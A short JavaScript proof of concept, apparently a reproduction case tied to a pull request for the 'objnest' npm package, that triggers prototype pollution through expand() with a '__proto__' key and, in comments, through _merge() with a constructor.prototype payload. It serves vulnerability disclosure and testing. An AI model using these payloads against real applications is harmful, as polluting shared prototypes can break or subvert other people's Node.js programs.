//https://github.com/okunishinishi/node-objnest/pull/6
const objnest = require("objnest");

objnest.expand({ "__proto__.polluted": "yes" });

// objnest._merge({}, JSON.parse('{ "constructor": {"prototype": {"polluted": "yes" }}}'))
// console.log({}.polluted)